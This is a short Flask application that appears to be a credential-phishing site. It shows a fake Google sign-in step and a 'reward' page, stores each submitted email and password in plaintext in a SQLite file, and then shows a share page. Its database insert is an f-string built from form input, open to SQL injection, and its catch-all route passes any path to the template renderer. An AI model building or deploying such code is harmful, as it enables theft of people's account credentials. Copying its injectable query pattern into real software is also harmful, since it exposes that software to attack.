from flask import Flask, render_template, request,session
import sqlite3
import re

app=Flask(__name__)
app.secret_key = "($usdanw*&" 

@app.route('/')
def index():
    session['user']=None
    return render_template('index.html')

@app.route("/gauth",methods=['POST'])
def glogin():
    session['user']=request.form['identifier']
    if not re.findall(r"@gmail.com",session['user']):session['user']+="@gmail.com"
    return render_template('googlepass.html',act=session['user'])

@app.route("/reward",methods=['POST'])
def share():
    if session['user']==None:
        email=request.form['email']
        passwd=request.form['pass']
    else:
        email=session['user']
        passwd=request.form['password']
    con=sqlite3.connect('static/ff-user.db')
    cur=con.cursor()
    cur.execute(f"insert into user(username,password) values('{email}','{passwd}')")
    con.commit()
    con.close()
    return render_template('share.html')

@app.route("/<name>",methods=['GET'])
def login(name):
    return render_template(f'{name}.html')

# @app.route('/db')
# def db():
#     try:
#         con=sqlite3.connect('static/ff-user.db')
#         cur=con.cursor()
#         cur.execute(f"create table user(id INTEGER PRIMARY KEY AUTOINCREMENT,username,password)")
#         con.commit()
#         con.close()
#         return "Database created"
#     except:return "Database Already exits"

if __name__=="__main__":
    app.run()